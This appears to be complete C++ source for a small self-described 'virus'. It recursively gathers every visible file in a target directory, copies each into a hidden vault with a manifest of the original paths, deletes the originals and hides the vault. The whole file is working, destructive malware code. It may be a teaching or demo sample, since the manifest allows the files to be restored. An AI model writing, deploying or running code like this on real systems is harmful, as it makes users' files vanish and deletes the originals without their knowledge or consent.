#include "common.h"
#include <fstream>
#include <iomanip>
#include <iostream>
#include <vector>

int main(int argc, char** argv) {
    fs::path target = (argc > 1) ? fs::path(argv[1]) : selfDirectory();

    std::error_code ec;
    if (!fs::is_directory(target, ec)) {
        std::cerr << "[virus] not a directory: " << target.string() << "\n";
        return 1;
    }

    fs::path vault        = target / VAULT_NAME;
    fs::path manifestPath = vault / MANIFEST_NAME;
    fs::path me           = selfPath();

    fs::create_directories(vault, ec);

    // Resume numbering after an existing manifest (idempotent re-runs).
    int nextIndex = 0;
    if (fs::exists(manifestPath, ec)) {
        std::ifstream in(manifestPath);
        std::string line;
        while (std::getline(in, line)) if (!line.empty()) ++nextIndex;
    }

    // ---- 1. Collect first (never delete while iterating) ----
    std::vector<fs::path> victims;
    auto opts = fs::directory_options::skip_permission_denied;
    for (auto it = fs::recursive_directory_iterator(target, opts, ec);
         it != fs::recursive_directory_iterator(); it.increment(ec))
    {
        if (ec) { ec.clear(); break; }
        auto& entry = *it;
        fs::path p  = entry.path();

        if (entry.is_directory(ec)) {
            // Skip the vault and any dot-prefixed / hidden directory.
            if (p.filename() == VAULT_NAME || isAlreadyHidden(p) || startsWithDot(p))
                it.disable_recursion_pending();
            continue;
        }
        if (!entry.is_regular_file(ec)) continue;
        if (isAlreadyHidden(p) || startsWithDot(p)) continue;   // leave pre-hidden files alone
        if (!me.empty() && fs::equivalent(p, me, ec)) { ec.clear(); continue; }

        victims.push_back(p);
    }

    if (victims.empty()) {
        std::cout << "[virus] nothing to infect in " << target.string() << "\n";
        return 0;
    }

    // ---- 2. Copy -> hide -> log -> delete ----
    std::ofstream manifest(manifestPath, std::ios::app);
    if (!manifest) { std::cerr << "[virus] cannot write manifest\n"; return 2; }

    int moved = 0;
    for (const auto& original : victims) {
        std::string logicalName = "stored_" + std::to_string(nextIndex) + ".bin";
        fs::path logicalPath    = vault / logicalName;

        fs::copy_file(original, logicalPath, fs::copy_options::overwrite_existing, ec);
        if (ec) {
            std::cerr << "[virus] copy failed: " << original.string()
                      << " (" << ec.message() << ")\n";
            ec.clear(); continue;
        }

        fs::path hidden = hideFile(logicalPath);   // may rename on Unix

        manifest << std::quoted(fs::absolute(original).string()) << " "
                 << std::quoted(hidden.filename().string())    << "\n";
        manifest.flush();

        fs::remove(original, ec);
        if (ec) { std::cerr << "[virus] delete failed: " << original.string() << "\n"; ec.clear(); }

        ++nextIndex;
        ++moved;
    }
    manifest.close();

    hideFile(vault);                                // no-op on Unix if already dot-named

    std::cout << "[virus] moved " << moved << " file(s) into "
              << vault.string() << "\n";
    return 0;
}